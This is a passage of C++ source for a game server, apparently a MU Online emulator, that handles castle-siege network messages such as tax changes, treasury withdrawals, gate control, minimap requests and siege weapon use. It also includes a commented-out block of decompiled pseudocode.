			LogAddTD("[CastleSiege] CGReqTaxRateChange() REQ OK - [%s][%s], Guild:(%s)(%d), TaxType:%d, TaxRate:%d",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, lpMsg->btTaxType, iTaxRate);
		}
	}
#endif
}

struct PMSG_ANS_TAXRATECHANGE {// <size 0xa>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btTaxType;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btTaxRate1;
  /*<thisrel this+0x7>*/ /*|0x1|*/ unsigned char btTaxRate2;
  /*<thisrel this+0x8>*/ /*|0x1|*/ unsigned char btTaxRate3;
  /*<thisrel this+0x9>*/ /*|0x1|*/ unsigned char btTaxRate4;
};

void GCAnsTaxRateChange(int iIndex, int iResult, BYTE btTaxType, int iTaxRate)
{
#if (GS_CASTLE==1)
	PMSG_ANS_TAXRATECHANGE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x09, sizeof(pMsgResult));
	pMsgResult.btResult = iResult;
	pMsgResult.btTaxType = btTaxType;
	pMsgResult.btTaxRate1 = SET_NUMBERH(SET_NUMBERHW(iTaxRate));
	pMsgResult.btTaxRate2 = SET_NUMBERL(SET_NUMBERHW(iTaxRate));
	pMsgResult.btTaxRate3 = SET_NUMBERH(SET_NUMBERLW(iTaxRate));
	pMsgResult.btTaxRate4 = SET_NUMBERL(SET_NUMBERLW(iTaxRate));
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}




void CGReqMoneyDrawOut(PMSG_REQ_MONEYDRAWOUT * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if(OBJMAX_RANGE(iIndex) == 0)
	{
		return;
	}

	if( lpMsg == NULL )
		return;

	if( strcmp(gObj[iIndex].GuildName, "") == 0 )
		return;
	
	if( g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE )
	{
		LogAddTD("[CastleSiege] CGReqMoneyDrawOut() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else if ( (gObj[iIndex].GuildStatus != G_MASTER) && (gObj[iIndex].GuildStatus != G_SUB_MASTER) )
	{
		LogAddTD("[CastleSiege] CGReqMoneyDrawOut() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else
	{
		int iMoneyChange = MAKE_NUMBERDW(MAKE_NUMBERW(lpMsg->btMoney4, lpMsg->btMoney3) , MAKE_NUMBERW(lpMsg->btMoney2, lpMsg->btMoney1));

		if( iMoneyChange <= 0 )
		{
			GCAnsMoneyDrawOut(iIndex, 0, 0);
			LogAddTD("[CastleSiege] CGReqMoneyDrawOut() ERROR - Req Money < 0 [%s][%s], Guild:(%s)(%d), Money:%d, TotMoney:%d",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, iMoneyChange, gObj[iIndex].Money);
		}
		else
		{
			int bRETVAL = g_CastleSiege.CheckCastleHasMoney(iMoneyChange);

			if( bRETVAL == FALSE )
			{
				GCAnsMoneyDrawOut(iIndex, 0, 0);
				LogAddTD("[CastleSiege] CGReqMoneyDrawOut() ERROR - Castle Money is Low [%s][%s], Guild:(%s)(%d), Money:%d, TotMoney:%d",
					gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, iMoneyChange, gObj[iIndex].Money);
			}
			else
			{
				__int64 tmpZen = (__int64)gObj[iIndex].Money + (__int64)iMoneyChange;
				if( tmpZen > MAX_ZEN )
				{
					GCAnsMoneyDrawOut(iIndex, 0, 0);
				}
				else
				{
					GS_GDReqCastleMoneyChange(g_MapServerManager.GetMapSvrGroup(), iIndex, (-1*iMoneyChange));
					LogAddTD("[CastleSiege] CGReqMoneyDrawOut() REQ OK - [%s][%s], Guild:(%s)(%d), Money:%d, TotMoney:%d",
						gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus, iMoneyChange, gObj[iIndex].Money);
				}
			}
		}
	}
#endif
}

struct PMSG_ANS_MONEYDRAWOUT {// <size 0xd>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btReserve1;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btReserve2;
  /*<thisrel this+0x7>*/ /*|0x1|*/ unsigned char btReserve3;
  /*<thisrel this+0x8>*/ /*|0x1|*/ unsigned char btReserve4;
  /*<thisrel this+0x9>*/ /*|0x1|*/ unsigned char btMoney1;
  /*<thisrel this+0xa>*/ /*|0x1|*/ unsigned char btMoney2;
  /*<thisrel this+0xb>*/ /*|0x1|*/ unsigned char btMoney3;
  /*<thisrel this+0xc>*/ /*|0x1|*/ unsigned char btMoney4;
};

void GCAnsMoneyDrawOut(int iIndex, int iResult, __int64 i64Money)
{
#if (GS_CASTLE==1)
#pragma message(" NOTE : Check MoneyDrawOut function answer!")
	PMSG_ANS_MONEYDRAWOUT pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x10, sizeof(pMsgResult));
	pMsgResult.btResult = iResult;
	pMsgResult.btMoney1 = SET_NUMBERH(SET_NUMBERHW(i64Money));
	pMsgResult.btMoney2 = SET_NUMBERL(SET_NUMBERHW(i64Money));
	pMsgResult.btMoney3 = SET_NUMBERH(SET_NUMBERLW(i64Money));
	pMsgResult.btMoney4 = SET_NUMBERL(SET_NUMBERLW(i64Money));

	pMsgResult.btReserve1 = 0x00;
	pMsgResult.btReserve2 = 0x00;
	pMsgResult.btReserve3 = 0x00;
	pMsgResult.btReserve4 = 0x00;
	
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}

struct PMSG_ANS_CSGATESTATE {// <size 0x7>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btIndex1;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btIndex2;
};

void GCAnsCsGateState(int iIndex, int iResult, int iGateIndex)
{
#if (GS_CASTLE==1)
	PMSG_ANS_CSGATESTATE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x11, sizeof(pMsgResult));
	pMsgResult.btResult = iResult;
	pMsgResult.btIndex1 = SET_NUMBERH(iGateIndex);
	pMsgResult.btIndex2 = SET_NUMBERL(iGateIndex);
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}





void CGReqCsGateOperate(PMSG_REQ_CSGATEOPERATE * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if(OBJMAX_RANGE(iIndex) == 0)
	{
		return;
	}

	if( strcmp(gObj[iIndex].GuildName, "") == 0 ) 
		return;

	if( (g_CastleSiege.GetCastleState() == 7) && (gObj[iIndex].m_btCsJoinSide != 1) )
	{
		LogAddTD("[CastleSiege] CGReqCsGateOperate() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);
	}
	else if( (g_CastleSiege.CheckCastleOwnerMember(iIndex) == FALSE) && (g_CastleSiege.CheckCastleOwnerUnionMember(iIndex) == FALSE) )
	{
		LogAddTD("[CastleSiege] CGReqCsGateOperate() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);	
	}
	else
	{
		int iGateIndex = MAKE_NUMBERW(lpMsg->btIndex1, lpMsg->btIndex2);
		
		if( g_CastleSiege.CheckCsGateAlive(iGateIndex) == TRUE ) 
		{
			int iOperateGate = g_CastleSiege.OperateGate(iGateIndex, lpMsg->btOperate);

			if( iOperateGate == 0 )
			{
				GCAnsCsGateOperate(iIndex, 0, -1, 0);
				LogAddTD("[CastleSiege] CGReqCsGateOperate() ERROR - Operate Gate Failed [%s][%s], Guild:(%s)(%d)",
					gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);	
			}
			else
			{
				GCAnsCsGateOperate(iIndex, 1, iGateIndex, lpMsg->btOperate);
				g_CastleSiege.SendCsGateStateViewPort(iGateIndex, lpMsg->btOperate);

				LogAddTD("[CastleSiege] CGReqCsGateOperate() OK - [%s][%s], Guild:(%s)(%d), DOOR:(%d)(X:%d,Y:%d)(STATUE:%d)",
					gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus,
					gObj[iGateIndex].X, gObj[iGateIndex].Y, gObj[iGateIndex].m_btCsGateOpen);
			}
		}
		else
		{
			GCAnsCsGateOperate(iIndex, 2, -1, 0);
			LogAddTD("[CastleSiege] CGReqCsGateOperate() ERROR - Gate Doesn't Exist [%s][%s], Guild:(%s)(%d)",
				gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);	
		}
	}
#endif
}

struct PMSG_ANS_CSGATEOPERATE {// <size 0x8>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btOperate;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btIndex1;
  /*<thisrel this+0x7>*/ /*|0x1|*/ unsigned char btIndex2;
};

void GCAnsCsGateOperate(int iIndex, int iResult, int iGateIndex, int iGateOperate)
{
#if (GS_CASTLE==1)
	PMSG_ANS_CSGATEOPERATE pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x12, sizeof(pMsgResult));
	pMsgResult.btResult = iResult;
	pMsgResult.btOperate = iGateOperate;
	pMsgResult.btIndex1 = SET_NUMBERH(iGateIndex);
	pMsgResult.btIndex2 = SET_NUMBERL(iGateIndex);
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}

struct PMSG_ANS_CSGATECURSTATE {// <size 0x7>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btOperate;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btIndex1;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btIndex2;
};

void GCAnsCsGateCurState(int iIndex, int iGateIndex, int iGateOperate)
{
#if (GS_CASTLE==1)
	PMSG_ANS_CSGATECURSTATE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x13, sizeof(pMsgResult));
	pMsgResult.btOperate = iGateOperate;
	pMsgResult.btIndex1 = SET_NUMBERH(iGateIndex);
	pMsgResult.btIndex2 = SET_NUMBERL(iGateIndex);
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}

struct PMSG_ANS_NOTIFYSWITCHPROC { // <size 0x9>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btIndex1;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btIndex2;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btUserIndex1;
  /*<thisrel this+0x7>*/ /*|0x1|*/ unsigned char btUserIndex2;
  /*<thisrel this+0x8>*/ /*|0x1|*/ unsigned char btSwitchState;
};


void GCAnsCsAccessSwitchState(int iIndex, int iSwitchIndex, int iSwitchUserIndex, BYTE btSwitchState)
{
#if (GS_CASTLE==1)
	PMSG_ANS_NOTIFYSWITCHPROC pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x14, sizeof(pMsgResult));
	pMsgResult.btIndex1 = SET_NUMBERH(iSwitchIndex);
	pMsgResult.btIndex1 = SET_NUMBERL(iSwitchIndex);
	pMsgResult.btUserIndex1 = SET_NUMBERH(iSwitchUserIndex);
	pMsgResult.btUserIndex1 = SET_NUMBERL(iSwitchUserIndex);
	pMsgResult.btSwitchState = btSwitchState;
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}

struct PMSG_ANS_NOTIFYCROWNPROC {// <size 0xc>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btCrownState;

  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char unk1;

  /*<thisrel this+0x >*/ /*|0x1|*/ //int iCrownAccessTime;

  /*<thisrel this+0x >*/ /*|0x1|*/ unsigned char unk2;
  /*<thisrel this+0x >*/ /*|0x1|*/ unsigned char unk3;
  /*<thisrel this+0x >*/ /*|0x1|*/ unsigned char unk4;
  /*<thisrel this+0x >*/ /*|0x1|*/ unsigned char timeSec;	//1sec = 4

  /*<thisrel this+0x >*/ /*|0x1|*/ unsigned char unk6;
  /*<thisrel this+0x >*/ /*|0x1|*/ unsigned char unk7;
};

void GCAnsCsAccessCrownState(int iIndex, BYTE btCrownState)
{
#if (GS_CASTLE==1)
	PMSG_ANS_NOTIFYCROWNPROC pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x15, sizeof(pMsgResult));
	pMsgResult.btCrownState = btCrownState;

	pMsgResult.unk1 = 0x00;
	//pMsgResult.iCrownAccessTime = gObj[iIndex].m_iAccumulatedCrownAccessTime;
	pMsgResult.unk2 = 0x00;
	pMsgResult.unk3 = 0x00;
	pMsgResult.unk4 = 0x00;
	pMsgResult.timeSec = (BYTE)(60-(gObj[iIndex].m_iAccumulatedCrownAccessTime/1000)*4);

	pMsgResult.unk6 = 0x00;
	pMsgResult.unk7 = 0x00;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}


/*
//----- (0045E540) --------------------------------------------------------
int __cdecl sub_45E540(int a1, unsigned __int8 a2)
{
  int v3; // esi@9
  DWORD v4; // edi@9
  char v5; // [sp+50h] [bp-Ch]@1
  unsigned __int8 v6; // [sp+54h] [bp-8h]@1
  signed int v7; // [sp+4Ch] [bp-10h]@9
  int v8; // [sp+58h] [bp-4h]@13
  unsigned __int8 v9; // [sp+51h] [bp-Bh]@13

  sub_40126C(&v5, -78, 21, 12);
  v6 = a2;
  if ( !a2 )
  {
    if ( *(_DWORD *)(6524 * a1 + 0x3D9DB64) < 0 || *(_DWORD *)(6524 * a1 + 0x3D9DB64) > 30000 )
      *(_DWORD *)(6524 * a1 + 0x3D9DB64) = 0;
    LogAddTD(
      "[CastleSiege] [Reg. Attempt] Accumulated Crown AccessTime : %d [%s](%s)(%s)",
      *(_DWORD *)(6524 * a1 + 0x3D9DB64));
  }
  if ( a2 == 1 )
  {
    LogAddTD(
      "[CastleSiege] [Reg. Success] Accumulated Crown AccessTime : %d [%s](%s)(%s)",
      *(_DWORD *)(6524 * a1 + 0x3D9DB64));
    *(_DWORD *)(6524 * a1 + 0x3D9DB64) = 0;
  }
  if ( a2 == 2 )
  {
    v3 = 6524 * a1;
    v4 = GetTickCount();
    *(_DWORD *)(6524 * a1 + 0x3D9DB64) = v4 - GetCrownAccessTickCount() + *(_DWORD *)(v3 + 64609124);
    v7 = 5000;
    *(_DWORD *)(6524 * a1 + 0x3D9DB64) -= 5000;
    if ( *(_DWORD *)(6524 * a1 + 0x3D9DB64) < 0 || *(_DWORD *)(6524 * a1 + 0x3D9DB64) > 30000 )
      *(_DWORD *)(6524 * a1 + 0x3D9DB64) = 0;
    LogAddTD(
      "[CastleSiege] [Reg. Fail] Accumulated Crown AccessTime : %d [%s](%s)(%s)",
      *(_DWORD *)(6524 * a1 + 0x3D9DB64));
  }
  v8 = *(_DWORD *)(6524 * a1 + 0x3D9DB64);
  return DataSend(a1, &v5, v9);
}
*/



void GCAnsCsNotifyStart(int iIndex, BYTE btStartState)
{
#if (GS_CASTLE==1)
	PMSG_ANS_NOTIFYCSSTART pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x17, sizeof(pMsgResult));
	pMsgResult.btStartState = btStartState;
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
#endif
}


void GCAnsCsNotifyProgress(int iIndex, BYTE btCastleSiegeState, LPSTR lpszGuildName)
{
	if ( lpszGuildName == NULL )
		return;

	PMSG_ANS_NOTIFYCSPROGRESS pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x18, sizeof(pMsgResult));
	pMsgResult.btCastleSiegeState = btCastleSiegeState;
	memset(pMsgResult.szGuildName, 0, sizeof(pMsgResult.szGuildName));
	memcpy(pMsgResult.szGuildName, lpszGuildName, sizeof(pMsgResult.szGuildName));

	DataSend(iIndex, (UCHAR*)&pMsgResult, pMsgResult.h.size);
}


struct PMSG_ANS_MAPSVRTAXINFO
{
	PBMSG_HEAD2 h;	// C1:B2:1A
	BYTE btTaxType;	// 4
	BYTE btTaxRate;	// 5
};


void GCAnsCsMapSvrTaxInfo(int iIndex, BYTE btTaxType, BYTE btTaxRate)
{
	PMSG_ANS_MAPSVRTAXINFO pMsgResult;
	
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1A, sizeof(pMsgResult));
	pMsgResult.btTaxType = btTaxType;
	pMsgResult.btTaxRate = btTaxRate;

	DataSend(iIndex, (UCHAR*)&pMsgResult, pMsgResult.h.size);

}




void CGReqCsMiniMapData(PMSG_REQ_MINIMAPDATA * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if( gObjIsConnected(iIndex) == FALSE ) 
		return;

	if( (gObj[iIndex].m_btCsJoinSide > 0) || ( g_CastleSiege.CheckUnionGuildMasterOrAssistant(iIndex) == FALSE ) )
	{
		GCAnsCsMiniMapData(iIndex, 3);
	}
	else if( g_CastleSiege.GetCastleState() != 7 )
	{
		GCAnsCsMiniMapData(iIndex, 2);
	}
	else
	{
		g_CastleSiege.AddMiniMapDataReqUser(iIndex);
		GCAnsCsMiniMapData(iIndex, 1);
	}
#endif
}



struct PMSG_ANS_MINIMAPDATA
{
	PBMSG_HEAD2 h;
	BYTE btResult;	// 4
};


void GCAnsCsMiniMapData(int iIndex, BYTE btResult)
{
	PMSG_ANS_MINIMAPDATA pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1B, sizeof(pMsgResult));
	pMsgResult.btResult = btResult;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}



void CGReqStopCsMiniMapData(PMSG_REQ_STOPMINIMAPDATA * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if( gObjIsConnected(iIndex) == FALSE ) 
		return;
	g_CastleSiege.DelMiniMapDataReqUser(iIndex);
#endif
}



void CGReqCsSendCommand(PMSG_REQ_CSCOMMAND * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if( gObjIsConnected(iIndex) == FALSE ) 
		return;

	if( (gObj[iIndex].m_btCsJoinSide > 0) && ( g_CastleSiege.CheckUnionGuildMasterOrAssistant(iIndex) == TRUE ) &&	( g_CastleSiege.GetCastleState() == 7 ) )
	{
		GCAnsCsSendCommand(gObj[iIndex].m_btCsJoinSide, lpMsg->btTeam, lpMsg->btX, lpMsg->btY, lpMsg->btCommand);
	}
#endif
}

struct PMSG_ANS_CSCOMMAND {// <size 0x8>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btTeam;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btX;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btY;
  /*<thisrel this+0x7>*/ /*|0x1|*/ unsigned char btCommand;
};


void GCAnsCsSendCommand(int iCsJoinSize, BYTE btTeam, BYTE btX, BYTE btY, BYTE btCommand)
{
#if (GS_CASTLE==1)
	//DebugLog("%s START",__FUNCTION__);
	PMSG_ANS_CSCOMMAND pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1D, sizeof(pMsgResult));
	
	pMsgResult.btTeam = btTeam;
	pMsgResult.btX = btX;
	pMsgResult.btY = btY;
	pMsgResult.btCommand = btCommand;
	
	for( int iIndex = OBJ_STARTUSERINDEX; iIndex < OBJMAX; iIndex++ )
	{
		if( gObjIsConnected(iIndex) == FALSE ) continue;

		if( (gObj[iIndex].m_btCsJoinSide == iCsJoinSize) && (gObj[iIndex].MapNumber == MAP_INDEX_CASTLESIEGE) )
		{
			DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
		}
	}
	//DebugLog("%s END",__FUNCTION__);
#endif
}


struct PMSG_ANS_CSLEFTTIMEALARM
{
	PBMSG_HEAD2 h;	// C1:B2:1E
	BYTE btHour;	// 4
	BYTE btMinute;	// 5
};


void GCAnsCsLeftTimeAlarm(BYTE btHour, BYTE btMinute)
{
	PMSG_ANS_CSLEFTTIMEALARM pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1E, sizeof(pMsgResult));
	pMsgResult.btHour = btHour;
	pMsgResult.btMinute = btMinute;

	for (int iIndex = OBJ_STARTUSERINDEX;iIndex < OBJMAX;iIndex++)
	{
		if ( !gObjIsConnected(iIndex) )
		{
			continue;
		}

		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
	}

}


void GCAnsSelfCsLeftTimeAlarm(int iIndex, BYTE btHour, BYTE btMinute)
{
	PMSG_ANS_CSLEFTTIMEALARM pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1E, sizeof(pMsgResult));
	pMsgResult.btHour = btHour;
	pMsgResult.btMinute = btMinute;

	if ( !gObjIsConnected(iIndex))
	{
		return;
	}

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}


void CGReqCsSetEnterHuntZone(PMSG_REQ_CSHUNTZONEENTER * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if( gObjIsConnected(iIndex) == FALSE )
		return;
	
	if( g_CastleSiege.CheckCastleOwnerMember(iIndex) == FALSE )
	{
		GCAnsCsSetEnterHuntZone(iIndex, 2, lpMsg->btHuntZoneEnter);
	}
	else if( g_CastleSiege.GetCastleState() == 7 )
	{
		GCAnsCsSetEnterHuntZone(iIndex, 0, lpMsg->btHuntZoneEnter);
	}
	else
	{
		//DebugLog("%s Set Hunt Zone: %d",__FUNCTION__,lpMsg->btHuntZoneEnter);
		g_CastleSiege.SetHuntZoneEnter(lpMsg->btHuntZoneEnter);
		GS_DGSetHuntZoneOpen();
		GCAnsCsSetEnterHuntZone(iIndex, 1, lpMsg->btHuntZoneEnter);
	}

#endif
}


struct PMSG_ANS_CSHUNTZONEENTER
{
	PBMSG_HEAD2 h;	// C1:B2:1F
	BYTE btResult;	// 4
	BYTE btHuntZoneEnter;	// 5
};


void GCAnsCsSetEnterHuntZone(int iIndex, BYTE btResult, BYTE btEnterHuntZone)
{
	PMSG_ANS_CSHUNTZONEENTER pMsgResult;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1F, sizeof(pMsgResult));
	pMsgResult.btResult = btResult;
	pMsgResult.btHuntZoneEnter = btEnterHuntZone;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}

struct PMSG_ANS_NPCDBLIST {// <size 0xc>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PWMSG_HEAD h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x8>*/ /*|0x4|*/ int iCount;
};


void CGReqNpcDbList(PMSG_REQ_NPCDBLIST * lpMsg, int iIndex)
{
	if(OBJMAX_RANGE(iIndex) == 0)
	{
		return;
	}

#if (GS_CASTLE==1)
	PMSG_ANS_NPCDBLIST pResult;

	if( lpMsg == NULL ) 
		return;
	if( strcmp(gObj[iIndex].GuildName, "") == 0 ) 
		return;
	
	if( g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE )
	{
		LogAddC(2, "[CastleSiege] CGReqNpcDbList() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);

		pResult.h.set((LPBYTE)&pResult, 0xB3, sizeof(pResult));
		pResult.iCount = 0;
		pResult.btResult = 2;

		DataSend(iIndex, (LPBYTE)&pResult, sizeof(pResult));
	}
	else if ( (gObj[iIndex].GuildStatus != G_MASTER) && (gObj[iIndex].GuildStatus != G_SUB_MASTER) )
	{
		LogAddC(2, "[CastleSiege] CGReqNpcDbList() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, gObj[iIndex].GuildStatus);

		pResult.h.set((LPBYTE)&pResult, 0xB3, sizeof(pResult));
		pResult.iCount = 0;
		pResult.btResult = 2;

		DataSend(iIndex, (LPBYTE)&pResult, sizeof(pResult));
	}
	else
	{
		switch( lpMsg->btMonsterCode )
		{
		case 1:
			g_CastleSiege.SendNpcStateList(iIndex, 277);
			break;
		case 2:
			g_CastleSiege.SendNpcStateList(iIndex, 283);
			break;
		}
	}
#endif
}



void CGReqCsRegGuildList(PMSG_REQ_CSREGGUILDLIST * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if( lpMsg == NULL ) return;

	GS_GDReqAllGuildMarkRegInfo(g_MapServerManager.GetMapSvrGroup(), iIndex);
#endif
}

struct PMSG_ANS_CSATTKGUILDLIST { // <size 0xc>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PWMSG_HEAD h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x8>*/ /*|0x4|*/ int iCount;
};

void CGReqCsAttkGuildList(PMSG_REQ_CSATTKGUILDLIST * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	//DebugLog("%s START",__FUNCTION__);
	PMSG_CSATTKGUILDLIST* lpMsgSendBody;
	char cBUFFER[1022];
	PMSG_ANS_CSATTKGUILDLIST* lpMsgSend;
	int iCount;

	if( lpMsg == NULL )	return;
	
	lpMsgSend = (PMSG_ANS_CSATTKGUILDLIST*)(cBUFFER);
	lpMsgSendBody = (PMSG_CSATTKGUILDLIST*)(cBUFFER+sizeof(PMSG_ANS_CSATTKGUILDLIST));

	iCount = 0;

	lpMsgSend->btResult = g_CastleSiege.GetCsAttkGuildList(lpMsgSendBody, iCount);
	lpMsgSend->iCount = iCount;

	if( lpMsgSend->iCount < 0 )	 lpMsgSend->iCount = 0;
	if( lpMsgSend->iCount > 100 )lpMsgSend->iCount = 100;

	lpMsgSend->h.set((LPBYTE)lpMsgSend, 0xB5, ((lpMsgSend->iCount*sizeof(PMSG_CSATTKGUILDLIST))+sizeof(PMSG_ANS_CSATTKGUILDLIST)));
	
	DataSend(iIndex, (LPBYTE)lpMsgSend, ((lpMsgSend->iCount*sizeof(PMSG_CSATTKGUILDLIST))+sizeof(PMSG_ANS_CSATTKGUILDLIST)));
	//DebugLog("%s END",__FUNCTION__);
#endif
}



struct PMSG_ANS_USEWEAPON
{
	PBMSG_HEAD2 h;	// C1:B7:01
	BYTE btResult;	// [1:Attacker] [2:Targets]	4
	BYTE btObjIndexH;	// 5
	BYTE btObjIndexL;	// 6
	BYTE btWeaponType;	// [1:Slingshot attack] [2:Slingshot defense]	7
	BYTE btPointX;	// 8
	BYTE btPointY;	// 9
};



void CGReqWeaponUse(PMSG_REQ_USEWEAPON * aRecv, int iIndex)
{
	WORD wObjIndex = MAKE_NUMBERW(aRecv->btObjIndexH, aRecv->btObjIndexL);

	if ( !OBJMAX_RANGE(wObjIndex))
		return;

	if ( !OBJMAX_RANGE(iIndex))
		return;

	LPOBJ lpOwnerObj = &gObj[iIndex];
	LPOBJ lpWeaponObj = &gObj[wObjIndex];

	if ( lpOwnerObj->Type != OBJ_USER )
		return;

	if ( lpWeaponObj->Type != OBJ_NPC )
		return;

	PMSG_ANS_USEWEAPON pMsg = {0};

	PHeadSubSetB((LPBYTE)&pMsg, 0xB7, 0x01, sizeof(pMsg));
	pMsg.btResult = 1;

	if ( lpWeaponObj->Class == 221 )	// Slingshot attack
	{
		pMsg.btWeaponType = 1;
		pMsg.btObjIndexH = SET_NUMBERH(wObjIndex);
		pMsg.btObjIndexL = SET_NUMBERL(wObjIndex);
		g_CsNPC_Weapon.GetTargetPointXY(lpWeaponObj->Class, aRecv->btTargetIndex-1, pMsg.btPointX, pMsg.btPointY, TRUE);
	}
	else if( lpWeaponObj->Class == 222 )	// Slingshot defense
	{
		pMsg.btWeaponType = 2;
		pMsg.btObjIndexH = SET_NUMBERH(wObjIndex);
		pMsg.btObjIndexL = SET_NUMBERL(wObjIndex);
